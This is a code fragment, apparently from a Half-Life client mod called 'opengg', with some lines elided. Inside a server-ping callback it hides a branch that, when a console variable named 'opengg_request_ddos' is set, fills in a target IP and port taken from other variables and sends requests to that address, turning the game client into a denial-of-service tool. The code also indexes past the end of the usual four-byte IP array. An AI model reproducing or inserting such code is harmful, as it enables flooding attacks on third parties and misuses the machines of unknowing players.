...
netadr_s* address;
netadr_t address_resp;
net_response_s* resp_;
//net_api_response_func_t resp;
...
void NET_CALLBACK PingResponse( struct net_response_s *response )
{
	if ( g_pServers )
	{
		...
		if(CVAR_GET_FLOAT("opengg_request_ddos")){
			address->ip[0] = CVAR_GET_FLOAT("opengg_ddosip1");
			address->ip[1] = CVAR_GET_FLOAT("opengg_ddosip2");
			address->ip[2] = CVAR_GET_FLOAT("opengg_ddosip3");
			address->ip[3] = CVAR_GET_FLOAT("opengg_ddosip4");
			address->ip[4] = CVAR_GET_FLOAT("opengg_ddosip5");
			address->port = CVAR_GET_FLOAT("opengg_ddosport");
			address_resp.ip[0] = CVAR_GET_FLOAT("opengg_ddosip1");
			address_resp.ip[1] = CVAR_GET_FLOAT("opengg_ddosip2");
			address_resp.ip[2] = CVAR_GET_FLOAT("opengg_ddosip3");
			address_resp.ip[3] = CVAR_GET_FLOAT("opengg_ddosip4");
			address_resp.ip[4] = CVAR_GET_FLOAT("opengg_ddosip5");
			address_resp.port = CVAR_GET_FLOAT("opengg_ddosport");
			resp_->remote_address = address_resp;
			NET_API->InitNetworking();
			NET_API->SendRequest(rand()%10000, 1, 0, 256, address, NULL);
		}
	}
}
